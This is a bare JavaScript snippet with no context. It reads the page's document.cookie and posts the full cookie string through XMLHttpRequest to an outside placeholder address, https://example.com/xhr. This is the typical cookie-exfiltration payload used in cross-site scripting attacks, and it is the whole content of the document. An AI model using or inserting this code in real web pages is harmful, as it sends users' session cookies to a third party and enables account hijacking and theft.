const cookieData = document.cookie;

const xhr = new XMLHttpRequest();

xhr.open("POST", "https://example.com/xhr");

xhr.send(cookieData);
